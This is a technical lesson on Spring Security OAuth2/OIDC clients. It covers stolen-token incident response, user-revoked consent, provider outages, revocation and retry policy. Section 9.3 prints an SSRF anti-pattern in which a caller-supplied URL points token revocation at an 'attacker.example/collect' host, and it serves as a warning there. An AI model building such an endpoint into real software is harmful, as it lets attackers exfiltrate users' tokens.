# 27.13. Handling Stolen Tokens, Revoked Permissions, and Provider Outages

## 1. Three Easily Confused Scenarios in an OAuth2/OIDC Client

In a **Spring Security OAuth 2.0 OIDC Client** application, an Access Token can stop working because it expired, the user revoked consent, the Authorization Server changed policy, or the token itself was stolen. Meanwhile, a connection error to the OpenID Provider (OP) may simply be a temporary infrastructure outage.

These three event categories require different responses:

1. **Stolen or suspected leaked token:** the goal is to **stop credential usage, limit blast radius, investigate, and restore access through a secure workflow**.
2. **Revoked application permissions:** the goal is to **stop reusing the rejected token/grant, never self-escalate privileges, and prompt the user to re-consent if appropriate**.
3. **Provider outage:** the goal is to **avoid losing valid data/tokens or causing a retry storm, maintain security boundaries, and recover smoothly**.

Example:

~~~text
                        Spring Boot OAuth2/OIDC Client
                                  |
                 OAuth2AuthorizedClientManager
                                  |
                     Authorized Client Store
                         /              \
                  Access Token       Refresh Token
                         |              |
                         v              v
                  Resource Server   Token Endpoint
                         |              |
                    HTTP 401/403    invalid_grant / 503
                         \              /
                          \            /
                           Incident classifier
                                 |
          +----------------------+---------------------+
          |                      |                     |
       COMPROMISE           REVOKED GRANT         OP OUTAGE
       Quarantine           Reauthorize          Backoff
       Revoke/rotate        only with consent     Preserve store
       Investigate         No privilege bypass   Degraded mode
~~~

Specifically: **HTTP 401 does not prove a token was stolen**, **HTTP 403 does not mean the user revoked consent**, and **HTTP 503 from the Token Endpoint is not a signal to wipe every Refresh Token**.

### Lesson Objectives

After this lesson, you will be able to:

- Build a threat model for Access Tokens, Refresh Tokens, Client Secrets, private keys, and OIDC sessions.
- Classify OAuth2 signals across the Token Endpoint, Resource Server, and provider outages.
- Understand the differences between **removing a local authorized client**, **revoking tokens at the Authorization Server**, **invalidating the RP session**, and **revoking grants**.
- Execute credential incident response in order: **containment → assessment → revocation/rotation → recovery → retrospective**.
- Configure Spring Security authorized-client lifecycle and failure handlers in both Servlet and Reactive stacks.
- Build retry/backoff/circuit-breaker strategies that avoid token refresh storms and concurrency bugs.
- Design user messaging, observability, tests, and operational runbooks.

> **Scope:** OAuth2 Client / OIDC Login in Spring Security, covering Authorization Code + PKCE, Refresh Tokens, and Client Credentials where appropriate. Examples use common APIs in Spring Security 6.x/7.x; cross-check your dependency BOM, servlet/reactive stack, and real provider documentation before production deployment. This is a design and operations lesson and does not replace your organization's incident response procedures.

## 2. Which Credentials Can Be Leaked and What Are the Consequences?

| Credential | Purpose | Consequence if leaked |
| --- | --- | --- |
| **Access Token** | Call Resource Servers | Attacker can call APIs within token scope until invalidated |
| **Refresh Token** | Obtain new Access Tokens | Can mint fresh tokens longer; broader, persistent risk |
| **Client Secret** | Authenticate confidential client | Can allow client impersonation on eligible grants |
| **Private key** for `private_key_jwt` | Sign client assertions | Can be abused to impersonate client until rotated/revoked |
| **mTLS client private key/certificate** | Authenticate client or bind tokens | Risk of sender impersonation per policy |
| **ID Token** | OIDC authentication at RP | Exposes PII/claims; not intended as an API token by default |
| **Session cookie** `JSESSIONID`/`SESSION` | Access local RP session | Can enable session hijacking |
| **Authorization code / PKCE verifier** | Authorization Code flow | Exposure during the sensitive window can affect token exchange |

### 2.1. Bearer Access Token

With an OAuth2 Bearer Token:

~~~http
Authorization: Bearer ACCESS_TOKEN_PLACEHOLDER
~~~

anyone possessing the token can attempt to send it to an API. **Scopes**, **audience**, **expiration**, **revocation**, and **sender-constraining** limit potential damage, but never make the token public data.

### 2.2. Refresh Tokens Have a Special Lifecycle

Refresh Tokens are normally sent only to the Token Endpoint; if stolen, an attacker can mint new Access Tokens unless prevented by client authentication, sender-binding, expiration, rotation, or OP policies.

Under **RFC 9700**, the Authorization Server must evaluate risk before issuing Refresh Tokens. For public clients, Refresh Tokens must use **sender-constraining or rotation** to detect replay. For confidential clients, refreshing is also bound to the issued client and its authentication method.

### 2.3. Not All "Token Leaks" Are Alike

~~~text
Case A: a short-lived 5-minute Access Token still valid gets written to logs
Case B: a long-lived Refresh Token appears in a database dump
Case C: a production client secret is committed to public Git
Case D: a private_key_jwt signing key is leaked
Case E: a user's session cookie is used by an attacker
~~~

The blast radius, revocation method, and investigation scope are **different**. Never apply a single "clear cache" action to all five situations.

## 3. Threat Model: Where Can Tokens Be Exfiltrated?

| Surface | Example risk | Mitigation |
| --- | --- | --- |
| Application logs/APM | Logging `Authorization` or token response bodies | Redaction, structured logging |
| Database/Redis/backups | Plaintext `OAuth2AuthorizedClient` storage | Application-level encryption, IAM, retention |
| Reverse proxy/service mesh | Unfiltered header tracing | Secure header logging, access controls |
| Browser/local storage | SPA storing tokens in `localStorage` | BFF pattern or threat-modeled storage strategy |
| Open redirect/SSRF | WebClient sending Bearer Token to unknown host | Host allowlist, avoid default token attachment to arbitrary URLs |
| Dependency/RCE | Attacker reading process memory or token store | Patching, runtime isolation, egress control |
| Developer workstation | Live tokens in HTTP collections or shell history | Test credentials and secrets hygiene |
| Authorization Server compromise | Compromised signing keys or client registrations | Trust/key incident response with provider |
| Session hijacking | Cookie stolen via XSS or network/client compromise | `HttpOnly`, `Secure`, `SameSite`, CSP, session lifecycle |

**Encrypting tokens in the database does not stop** a compromised process from reading tokens after decrypting them. Combine encryption, KMS key controls, access control, network egress limits, rotation, and monitoring.

### 3.1. Do Not Confuse "Suspected Exposure" with "Confirmed Exposure"

Workflows commonly classify signals into tiers:

- **Suspected:** suspicious indicator without proof that the token was exfiltrated.
- **Confirmed exposure:** evidence the token appeared in an unauthorized location.
- **Confirmed misuse:** evidence the token was used without authorization.

For high-privilege credentials, **containment may need to start while exposure is still suspected**, before full investigation completes. Even then, track confidence level, scope, and reversible actions instead of assuming every 401 is a theft.

## 4. Distinguishing Four Layers When Errors Occur

~~~text
Browser / User
   |
   v
RP (Spring Security OIDC Login)
   |    local authentication/session
   |
   +-----> Authorization Server / OP
   |       authorization, token, refresh, revocation, UserInfo
   |
   +-----> Resource Server / API
           Bearer validation, scopes, audience, business permissions
~~~

| Layer | Indicators | Required action |
| --- | --- | --- |
| **RP local session** | Expired cookie, logout, invalid session | Re-login per local policy |
| **Authorization Server** | `invalid_grant`, `invalid_client`, `temporarily_unavailable` | Classify grant vs. secret vs. infrastructure |
| **Resource Server** | `401 invalid_token`, `403 insufficient_scope` | Inspect Access Token validation and permissions |
| **Network/Provider** | DNS/TLS timeout, 429/502/503 | Degraded mode, bounded retry |

**Never translate an error at one layer into a conclusion about another layer.** For instance, a Resource Server 403 does not prove the client secret was leaked.

## 5. OAuth2 Error Classification and Actions Table

| Source | Error | Common meaning | Action |
| --- | --- | --- | --- |
| Token Endpoint | `invalid_grant` | Code/Refresh Token/grant invalid, expired, revoked, or replayed | Stop reusing old grant, prompt reauthorization when appropriate; check concurrency |
| Token Endpoint | `invalid_client` | Client authentication failed | Check secret/key/method/client policy; no unbounded retries |
| Token Endpoint | `invalid_scope` | Invalid or overprivileged scope | Fix request/consent; never self-escalate |
| Token Endpoint | `unauthorized_client` | Client not permitted for grant | Investigate registration/policy |
| Authorization Endpoint | `access_denied` | User or OP denied authorization | Respect decision; never bypass |
| Authorization Endpoint | `temporarily_unavailable` | OP temporarily overloaded/maintenance | Show temporary error, bounded retry/wait |
| Resource Server | 401, Bearer `invalid_token` | Access Token invalid, expired, revoked, or mismatched | Stop sending stale token; check handler and token contract |
| Resource Server | 403, Bearer `insufficient_scope` | Missing required scope for resource | Never fall back to admin; adjust permissions via workflow |
| Resource Server | 403 without Bearer error | Business authorization/tenant/ACL | Investigate API permissions; do not blindly wipe tokens |
| Revocation Endpoint | 200 | Token revoked **or already invalid** | Treat token invalidation goal as satisfied per RFC 7009 |
| Revocation Endpoint | 503 | Revocation not yet confirmed | Keep pending revocation, bounded retry later |
| Revocation Endpoint | `unsupported_token_type` | OP does not support revoking that token type | Use alternative mitigation per provider contract |
| OP / JWKS | TLS/DNS timeout, 503 | Provider or network outage | Never disable signature/issuer checks |

### 5.1. For 401 and 403, Also Inspect `WWW-Authenticate`

Examples per RFC 6750:

~~~http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer error="invalid_token"
~~~

~~~http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer error="insufficient_scope", scope="reports.write"
~~~

Depending on the implementation, an API may return custom codes or response bodies. Classify using **HTTP status + OAuth2 Bearer error + provider contract**, rather than assuming a bare 401/403 means token theft.

### 5.2. `invalid_grant` Has Multiple Causes

`invalid_grant` can happen because:

- The Refresh Token expired or was revoked by the user.
- The OP already rotated the Refresh Token, and the client reused the older one.
- Two concurrent refresh requests raced.
- The client submitted a grant/token belonging to a different registration.
- The OP changed policy or invalidated the grant.
- The OP detected replay and revoked the token family.

**Do not conclude with certainty that "an attacker replayed the token"** from this error alone. Correlate OP logs, the authorized client store, and concurrency telemetry.

## 6. Runbook: Detecting a Stolen Token

When evidence shows a token appeared in public logs, a repository, a leaked backup, or anomalous token usage traffic:

### 6.1. Phase 1 — Confirm and Contain Damage

1. Record **detection time**, credential type, registration ID, provider alias, environment, and affected tenant/principal; never paste raw tokens into tickets.
2. Classify as **Access Token**, **Refresh Token**, **Client Secret**, **private key**, or **session cookie**.
3. Determine blast radius: single user, single client, single tenant, or multiple production instances.
4. Cut off the leak source: disable sensitive logging, shut down debug endpoints, tighten IAM and network egress if needed.
5. Consider marking affected integration/user connections as **QUARANTINED** so managers and workers stop using the suspected credential.
6. Preserve forensic evidence securely per incident retention policy without copying raw tokens across channels.
7. Engage Security and provider liaisons when scope and severity exceed threshold.

### 6.2. Phase 2 — Revoke and Replace Credentials

- Request the OP to **revoke** the token or **revoke the grant/token family** if supported.
- For Refresh Token compromise: prioritize invalidating the Refresh Token and associated grants; do not merely delete the local Access Token.
- For Access Token compromise: revoke if supported by the OP; evaluate TTL, Resource Server introspection/denylists, and sender constraints.
- For Client Secret compromise: rotate the secret at the OP and secret manager, roll out across instances, and review potentially affected grants.
- For private key compromise: rotate/revoke the key/certificate, update trusted registrations, and evaluate related sender-constrained tokens.
- For session cookie compromise: invalidate local sessions and evaluate OP logout/reauthentication per risk and user policy.

### 6.3. Phase 3 — Service Recovery

1. Verify the OP confirmed revocation/rotation per contract.
2. Delete/quarantine cached authorized clients scoped to the **exact registration + principal + tenant**.
3. Allow users to reauthorize via a secure Authorization Code flow where appropriate.
4. Never restore previously compromised Refresh Tokens from backups.
5. Monitor anomalous errors and attempts to reuse old tokens.
6. Close the incident only after confirming compromised credentials no longer work, or document residual risk explicitly if unprovable.

### 6.4. Phase 4 — Retrospective

Identify root cause, exposure window, data impact, time to detect, and containment effectiveness. Tune log redaction, secret scanning, CI gates, encryption at rest, IAM, and training. If personal data may have been impacted, coordinate with legal/compliance teams on statutory notification obligations.

## 7. Response Flowchart for Signs of Token Compromise

~~~mermaid
flowchart TD
    A["Anomalous event detected"] --> B{"Could credential be exposed?"}
    B -->|Unclear| C["Collect evidence safely + assess risk"]
    B -->|Yes / high risk| D["Quarantine exact principal/registration/client"]
    C --> E{"Enough risk to warrant containment?"}
    E -->|Yes| D
    E -->|No| F["Monitor + investigate; no mass wipe"]
    D --> G{"Credential type?"}
    G -->|Access Token| H["Revoke if supported, tighten TTL/scope, inspect RS"]
    G -->|Refresh Token| I["Revoke grant/token family, block refresh"]
    G -->|Client Secret / key| J["Rotate key/secret, coordinate with provider"]
    G -->|Session cookie| K["Invalidate session + re-auth policy"]
    H --> L["Delete/quarantine local cache and monitor"]
    I --> L
    J --> L
    K --> L
    L --> M["Reauthorize/reconnect via valid workflow"]
    M --> N["Verify + incident retrospective"]
~~~

**Quarantine differs from delete:** quarantine blocks new tasks from using a credential; delete removes the local record; revoke instructs the Authorization Server to block token usage. An incident may require all three, and **none replaces the others**.

## 8. Deleting a Local Authorized Client Does Not Revoke at the Provider

Spring Security stores:

~~~text
(registrationId, principalName) -> OAuth2AuthorizedClient
  Access Token
  Refresh Token, if present
~~~

Calling:

~~~java
authorizedClientService.removeAuthorizedClient(
    registrationId, principalName);
~~~

only deletes the record in the **store managed by that service**. It does not send an HTTP request to the OP Revocation Endpoint.

### 8.1. Four Actions with Different Scopes

| Action | Actual effect |
| --- | --- |
| Delete local `OAuth2AuthorizedClient` | Client stops loading tokens from that record |
| RFC 7009 token revocation | OP is requested to invalidate the submitted token |
| `HttpSession.invalidate()` / WebSession invalidation | Ends local RP browser session |
| OIDC RP/Back-Channel Logout | Coordinates session logout with OP or from OP to RP |

Do not claim "all permissions have been revoked" when you have only called `removeAuthorizedClient`.

### 8.2. Deleting Before Revoking Can Lose Your Only Copy of the Credential

Anti-pattern:

~~~text
1. Delete Refresh Token from database
2. Call revoke endpoint afterward
3. OP returns 503
4. No token value remains to retry revocation
~~~

If the provider fails to confirm revocation, the token may **still remain valid**. A safer workflow can be:

1. Mark the connection **SUSPENDED/REVOKING** first, blocking all outbound usage.
2. Move the token pending revocation into an **encrypted restricted revocation queue** or lock the record against use.
3. Submit revocation using valid client credentials and a verified endpoint.
4. Once the OP confirms per contract, remove the local/queued token per retention policy.
5. On transient OP failures, keep the pending state and retry within bounds with monitoring.

Never turn such a queue into a second plaintext token warehouse. All copies must be encrypted, access-controlled, and bounded by clear TTL/retention rules.

## 9. RFC 7009: Understanding the Token Revocation Endpoint Properly

An Authorization Server may publish `revocation_endpoint` in metadata. The client sends an **HTTPS POST**, typically with `application/x-www-form-urlencoded`:

~~~http
POST /oauth2/revoke HTTP/1.1
Host: id.example.net
Authorization: Basic BASE64_CLIENT_CREDENTIALS_PLACEHOLDER
Content-Type: application/x-www-form-urlencoded

token=REFRESH_TOKEN_PLACEHOLDER&token_type_hint=refresh_token
~~~

This example illustrates request format only, **containing no real tokens or secrets**. Client authentication must match registration (`client_secret_basic`, `client_secret_post`, `private_key_jwt`, mTLS, etc.); do not force every provider onto Basic auth.

### 9.1. Key Protocol Semantics

- `token` is required; `token_type_hint` is a hint (`refresh_token` or `access_token`), not an authorization override.
- The endpoint URL must come from **trusted provider metadata/config**, never user input.
- RFC 7009 returns **HTTP 200** when the token was successfully revoked **or was already invalid**.
- HTTP 200 does not reveal whether the token ever existed or was revoked deliberately.
- On **HTTP 503**, the client **must assume the token may still exist** and retry after a reasonable interval per `Retry-After`.
- The OP may also revoke other tokens tied to the same authorization grant; propagation scope depends on provider policy.
- No OP is forced to support revoking every Access Token type; `unsupported_token_type` can occur.

### 9.2. Does Revoking a Refresh Token Always Stop Access Tokens Immediately?

Never guarantee that by assumption. RFC 7009 recommends that revoking a Refresh Token should invalidate related Access Tokens where revocation is supported; however, implementation details and propagation delays vary. A self-contained JWT already held by a Resource Server may still be accepted until expiry unless introspection, denylists, or session binding are enforced.

### 9.3. Never Call Revocation Against a Caller-Supplied URL

An endpoint like:

~~~text
POST /revoke?uri=https://attacker.example/collect
~~~

invites **SSRF and token exfiltration**. The revocation URL must come from an allowlist/trusted registration. Never use a WebClient configured with a default Bearer Token against arbitrary hosts.

### 9.4. Local Controls Are Still Needed After HTTP 200

After receiving 200, the client must **never reuse the token**. Update connection state and purge local tokens appropriately. If caches span multiple pods, broadcast invalidations or use versioned state/shared stores so no worker holds a stale copy.

## 10. Refresh Token Rotation: From Signal to Investigation

With rotation:

~~~mermaid
sequenceDiagram
    autonumber
    participant App as Legitimate Client
    participant OP as Authorization Server
    participant Evil as Attacker
    App->>OP: refresh_token=R1
    OP-->>App: access_token=A2, refresh_token=R2
    Evil->>OP: refresh_token=R1 (already invalidated)
    OP-->>Evil: invalid_grant / replay signal
    Note over OP: OP may revoke active token family
    App->>OP: refresh_token=R2
    OP-->>App: invalid_grant
~~~

A replay signal can indicate the **token family is compromised**, though the Authorization Server cannot always distinguish which party sent the older token. Coordinate with the provider to assess scope, revoke the grant where appropriate, and require reauthorization.

### 10.1. Concurrent Refreshes Are Not Automatically Token Theft

~~~text
Request A loads R1
Request B loads R1
Request A refreshes -> gets R2 and saves it
Request B refreshes R1 -> invalid_grant
~~~

This can be a **benign race condition**. If B's failure handler deletes A's newly saved R2 record, the client loses the valid token. Consider:

- Single-flight refresh keyed by `(registrationId, principalName, tenant)` where appropriate.
- Optimistic locking or conditional versioned delete/update.
- Atomic persistence whenever the OP rotates Refresh Tokens.
- Never using a global lock across all users.
- Monitoring to tell concurrency races apart from compromise.

### 10.2. Do Not Retry `invalid_grant` with the Same Old Refresh Token

If a grant has been revoked, infinitely retrying R1 grants no access and can trigger lockouts or rate limits. Transition state to **REAUTH_REQUIRED** or **SUSPENDED**, display a safe prompt, and launch a valid Authorization Code flow when the user consents.

## 11. What Does Spring Security's `OAuth2AuthorizedClientManager` Handle?

`OAuth2AuthorizedClientManager` handles:

1. Resolving the matching `ClientRegistration` and principal.
2. Loading any existing authorized client.
3. Requesting/refreshing tokens via `OAuth2AuthorizedClientProvider` when needed.
4. Calling the success handler to persist updated clients.
5. Calling the failure handler when authorization or re-authorization fails.

### 11.1. Default Behavior on `invalid_grant`

In Spring Security, `DefaultOAuth2AuthorizedClientManager` (Servlet HTTP request context) and `AuthorizedClientServiceOAuth2AuthorizedClientManager` (outside Servlet requests) ship with default failure handlers that can **remove the authorized client** when re-authorization fails with `invalid_grant`.

**This is stale-token cleanup, not full incident response:** it does not investigate theft, revoke all grants at the provider, or notify users automatically.

### 11.2. Custom Failure Handlers Can Replace Default Logic

If an application calls `manager.setAuthorizationFailureHandler(...)`, check whether the custom handler still removes stale clients for appropriate error codes. If a custom handler only logs, an invalid Refresh Token may be retried repeatedly.

Similarly, a custom success handler must persist updated Access/Refresh Tokens to the right store after refresh; otherwise token rotation will break on the subsequent cycle.

### 11.3. Never Wipe Data When the Token Endpoint Is Merely Temporarily Unavailable

`temporarily_unavailable`, timeouts, HTTP 429, or 503 do not prove the Refresh Token was revoked. Never run:

~~~java
// ANTI-PATTERN: do not wipe tokens on arbitrary network errors.
catch (Exception ex) {
    authorizedClientService.removeAuthorizedClient(id, principal);
}
~~~

Distinguish **permanent authorization failures** from **transient provider failures** before deleting records.

## 12. Servlet: Illustrative Manager and Provider Configuration

Spring Security OAuth2 Client example in Servlet:

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProvider;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProviderBuilder;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.DefaultOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.web.OAuth2AuthorizedClientRepository;

@Configuration
public class OAuth2ClientManagerConfig {

    @Bean
    OAuth2AuthorizedClientManager authorizedClientManager(
            ClientRegistrationRepository registrations,
            OAuth2AuthorizedClientRepository authorizedClients) {

        OAuth2AuthorizedClientProvider provider =
            OAuth2AuthorizedClientProviderBuilder.builder()
                .authorizationCode()
                .refreshToken()
                .clientCredentials()
                .build();

        DefaultOAuth2AuthorizedClientManager manager =
            new DefaultOAuth2AuthorizedClientManager(
                registrations, authorizedClients);

        manager.setAuthorizedClientProvider(provider);
        return manager;
    }
}
~~~

This example applies to code running **within a Servlet HTTP request**. Background jobs lack an `HttpServletRequest` and typically require `AuthorizedClientServiceOAuth2AuthorizedClientManager` backed by `OAuth2AuthorizedClientService`, a stable system principal, and appropriate providers.

**Do not enable all three grants if your product does not need them.** For machine-to-machine Client Credentials, a dedicated manager supporting only `clientCredentials()` is easier to lock down for scopes, credentials, and secret rotation.

## 13. Handling Resource Server 401/403 with Spring Security WebClient

When an application calls an API via `WebClient`, Spring Security's OAuth2 exchange filter injects the Bearer Access Token. That filter can also forward `401/403` responses with Bearer errors to an authorization failure handler.

### 13.1. Servlet WebClient with Repository Constructor

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.OAuth2AuthorizedClientRepository;
import org.springframework.security.oauth2.client.web.reactive.function.client.ServletOAuth2AuthorizedClientExchangeFilterFunction;
import org.springframework.web.reactive.function.client.WebClient;

@Configuration
public class ReportsClientConfig {

    @Bean
    WebClient reportsWebClient(
            ClientRegistrationRepository registrations,
            OAuth2AuthorizedClientRepository authorizedClients) {

        ServletOAuth2AuthorizedClientExchangeFilterFunction oauth2 =
            new ServletOAuth2AuthorizedClientExchangeFilterFunction(
                registrations, authorizedClients);

        return WebClient.builder()
            .baseUrl("https://reports.example.net")
            .apply(oauth2.oauth2Configuration())
            .build();
    }
}
~~~

With the **registrations + repository** constructor, the filter can preconfigure `RemoveAuthorizedClientOAuth2AuthorizationFailureHandler`. When the API returns a matching Bearer error, the filter removes the cached authorized client so the **next request** has a chance to acquire a fresh token.

### 13.2. Caution with the Manager-Based Constructor

~~~java
new ServletOAuth2AuthorizedClientExchangeFilterFunction(
    authorizedClientManager);
~~~

With the manager constructor, the filter **does not automatically configure** a failure handler for Resource Server errors. If you want to evict the authorized client on matching Bearer `invalid_token` responses, configure `setAuthorizationFailureHandler(...)` with `RemoveAuthorizedClientOAuth2AuthorizationFailureHandler` or a remover targeting the right repository/service. Do not confuse this with the manager's failure handler for Token Endpoint authorization errors.

### 13.3. Do Not Delete Tokens on Every 403

`403 insufficient_scope` signals missing permission, **not a reason to switch to an admin registration or wipe grants for every user**. Spring's default handlers filter by OAuth2 error codes. If you write a custom HTTP filter, preserve that distinction.

### 13.4. Do Not Auto-Retry Every Request Immediately

The failure handler may **evict the cached client**, yet the in-flight request may still surface a 401. Before auto-retrying, verify:

- Is the HTTP method idempotent?
- Can the request body be safely replayed?
- Does a newly minted token actually carry the right audience?
- Is there risk of an infinite refresh → API 401 → refresh loop?

For `POST`/`PATCH`/`DELETE`, enforce idempotency keys or downstream transaction rules before retrying.

## 14. Local Invalidation Scoped to Exact Principal and Registration

A service can proactively delete a local authorized client **once incident/cleanup policy dictates**:

~~~java
package com.example.security;

import org.springframework.security.oauth2.client.OAuth2AuthorizedClientService;
import org.springframework.stereotype.Service;

@Service
public class LocalAuthorizedClientInvalidationService {

    private final OAuth2AuthorizedClientService authorizedClients;

    public LocalAuthorizedClientInvalidationService(
            OAuth2AuthorizedClientService authorizedClients) {
        this.authorizedClients = authorizedClients;
    }

    public void invalidateLocalRecord(
            String trustedRegistrationId,
            String trustedPrincipalName) {

        authorizedClients.removeAuthorizedClient(
            trustedRegistrationId,
            trustedPrincipalName);
    }
}
~~~

**Important limitation:** this performs **local service-store removal only**. It does not revoke tokens at the OP, does not invalidate `HttpSession`, and may miss records if the manager actually persists into a different store.

`trustedPrincipalName` must be resolved server-side from Authentication/identity mapping, never taken from an arbitrary caller parameter like `?username=bob`. In multi-tenant apps, verify the caller's authorization over the tenant/connection before deleting.

### 14.1. Inventory Your Actual Token Stores

An application may persist authorized clients across:

- JDBC or in-memory `OAuth2AuthorizedClientService`.
- Servlet `HttpSession`-backed `OAuth2AuthorizedClientRepository`.
- `ReactiveOAuth2AuthorizedClientService` or `ServerOAuth2AuthorizedClientRepository` in WebFlux.
- Custom encrypted Redis/JDBC stores or session serialization.

Never assume deleting one row in JDBC purges every copy inside sessions, background workers, and pods.

## 15. Reactive/WebFlux: Failure Handling Differs from Servlet

In the Reactive stack:

~~~java
package com.example.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.client.registration.ReactiveClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.server.ServerOAuth2AuthorizedClientRepository;
import org.springframework.security.oauth2.client.web.reactive.function.client.ServerOAuth2AuthorizedClientExchangeFilterFunction;
import org.springframework.web.reactive.function.client.WebClient;

@Configuration
public class ReactiveReportsClientConfig {

    @Bean
    WebClient reactiveReportsWebClient(
            ReactiveClientRegistrationRepository registrations,
            ServerOAuth2AuthorizedClientRepository authorizedClients) {

        ServerOAuth2AuthorizedClientExchangeFilterFunction oauth2 =
            new ServerOAuth2AuthorizedClientExchangeFilterFunction(
                registrations, authorizedClients);

        return WebClient.builder()
            .baseUrl("https://reports.example.net")
            .filter(oauth2)
            .build();
    }
}
~~~

With the **registrations + server repository** constructor, the Reactive filter wires a default failure handler routing Resource Server Bearer errors to `RemoveAuthorizedClientReactiveOAuth2AuthorizationFailureHandler` for matching error codes.

With the constructor taking a manager:

~~~java
new ServerOAuth2AuthorizedClientExchangeFilterFunction(
    reactiveAuthorizedClientManager);
~~~

the filter **does not forward** Resource Server 401/403 responses to a failure handler by default. Configure `setAuthorizationFailureHandler(...)` with a `ReactiveOAuth2AuthorizationFailureHandler` if eviction is desired.

### 15.1. Reactive Token-Store Deletion

~~~java
Mono<Void> cleanup =
    reactiveAuthorizedClientService.removeAuthorizedClient(
        trustedRegistrationId,
        trustedPrincipalName);
~~~

This `Mono<Void>` must be **composed and subscribed by the framework**; never call `.block()` on a Reactor event loop or fire-and-forget `.subscribe()` outside your transaction/incident workflow.

### 15.2. Reactive Background Jobs

For jobs lacking a `ServerWebExchange`, use `AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager` instead of a web-request-bound manager, paired with an explicit application principal. This matters especially when service Client Credentials are revoked or client secrets rotate.

## 16. Connection State Machine: Avoiding Reuse of Locked Tokens

A multi-worker system should track connection lifecycle states explicitly:

~~~mermaid
stateDiagram-v2
    [*] --> ACTIVE
    ACTIVE --> SUSPENDED: suspected compromise / user pause
    ACTIVE --> REAUTH_REQUIRED: invalid_grant / consent revoked
    ACTIVE --> DEGRADED: provider unavailable
    DEGRADED --> ACTIVE: provider recovered + policy permits
    DEGRADED --> SUSPENDED: risk escalated
    SUSPENDED --> REVOKING: submit revocation
    REVOKING --> DISCONNECTED: confirmed revocation + cleanup
    REVOKING --> PENDING_REVOCATION: OP outage/503
    PENDING_REVOCATION --> REVOKING: retry allowed
    REAUTH_REQUIRED --> ACTIVE: new authorized grant
    DISCONNECTED --> ACTIVE: explicitly linked again
~~~

### 16.1. `ACTIVE` vs. `DEGRADED`

`DEGRADED` indicates the provider/API is temporarily unavailable; credentials may still be valid. **Never automatically convert every `DEGRADED` state into `REAUTH_REQUIRED`.**

### 16.2. `SUSPENDED` Must Block All Outbound Use

If an API gateway only hides a UI button while a background scheduler still loads the Refresh Token and calls APIs, containment fails. Every entrypoint (controllers, async jobs, queues, scheduled tasks) must verify the **shared connection state** before authorizing or calling Resource Servers.

### 16.3. Guarding Against Stale Workers

A worker node might have loaded an authorized client right before the incident service set `SUSPENDED`. Implement:

- Versioned shared state/flags.
- Fresh recheck immediately before sensitive operations.
- Cache invalidation upon state transitions.
- Bounded TTLs on in-memory copies.
- Transactions/compare-and-swap so stale responses cannot reactivate a connection.

## 17. User-Revoked Permissions: Detecting and Respecting Consent Withdrawal

Access can be revoked when:

- The user clicks "Remove access" at the OP.
- An admin revokes a grant or disables the application.
- The provider locks or disables the user account.
- Client registration is deleted or scopes are narrowed.
- The provider enforces new conditional access/consent rules.
- OIDC Back-Channel Logout ends OP/RP sessions (which does not necessarily revoke every Refresh Token).

### 17.1. Valid Access Token with Revoked Refresh Token

An already-issued Access Token may remain valid until expiry even after the Refresh Token ceases working. The application **must not keep syncing indefinitely** once it learns the grant was revoked; respect consent state per provider contract while distinguishing normal token expiry from provider revocation propagation.

### 17.2. Never Automatically Switch to a Higher-Privilege Registration

Anti-pattern:

~~~text
reports.read token receives 403
  -> application falls back to admin-service client credentials
  -> executes operation with system privileges
~~~

This creates **confused deputy / privilege escalation**. If the user revoked delegated permission, the backend must never bypass that decision with a high-privilege machine token unless a completely separate, explicitly authorized and audited workflow applies.

### 17.3. Re-Consent Belongs to the User and Policy

Appropriate UI message:

> Your connection to the provider has expired or access permissions changed. Please reconnect to resume syncing.

Never prompt the user to enter their OP password into an RP form. Redirect to the official Authorization Endpoint via Spring Security's OAuth2 Authorization Code flow with `state` and PKCE.

### 17.4. Revoked Consent Cannot Be Fixed by Infinite Retries

When `invalid_grant` repeats on refresh, stop grant attempts, transition to `REAUTH_REQUIRED`, and alert if volume spikes. Endless retries trigger lockouts/rate limits and mask real incidents.

## 18. Provider Outages: State-Preservation Principles

An OP or Authorization Server can experience:

- DNS resolution failures, network partitions, or TLS handshake timeouts.
- HTTP 429 rate limits or 502/503/504 gateway errors.
- Token Endpoint or UserInfo Endpoint unavailability.
- Unreachable OIDC Discovery/JWKS endpoints.
- Key rotation/JWKS propagation delays.
- Ongoing provider incidents reported on status pages.
- Partial outages: Token Endpoint down while Resource Servers still respond.

**A temporary provider failure does not automatically mean tokens were revoked or compromised.** Base your response on the affected endpoint, error category, outage duration, and sensitivity level.

### 18.1. When the OP Login Endpoint Is Down

New users may be unable to log in. Present a safe error page; never fall back to an "unauthenticated mode" and never trust unverified JWTs.

For already-authenticated sessions, decide whether to keep serving **local, non-sensitive functions** according to business/security policy. Never grant new privileges simply because the OP is unreachable.

### 18.2. When the Token Endpoint Is Down

With an unexpired Access Token, some API calls may keep succeeding. For tokens needing refresh, surface a transient failure and schedule policy-driven retries; **do not delete Refresh Tokens** just because of a timeout.

### 18.3. When the Resource Server Is Down

The provider may still issue tokens normally while the downstream API returns 503. Do not keep requesting new Access Tokens repeatedly to work around a Resource Server infrastructure outage.

### 18.4. When UserInfo Is Down

If UserInfo is a mandatory part of the login contract, login may fail or degrade cleanly. Never fabricate an `OidcUser` with data pulled from unverified endpoints; define optional vs. required claims explicitly by design.

## 19. Safe Retry Policies: Do Not Apply One Rule to Every Error

| Error | Retry? | Notes |
| --- | --- | --- |
| Network timeout to OP | Yes, bounded | Account for whether OP may have processed request |
| HTTP 429 | Yes, honoring `Retry-After`/backoff | Avoid thundering herd |
| HTTP 503/502/504 | Yes, bounded | Circuit breaker, jitter |
| Token Endpoint `invalid_grant` | **No** infinite retries with old token | Reauthorization / incident investigation |
| `invalid_client` | No endless retries | Fix client secret/registration |
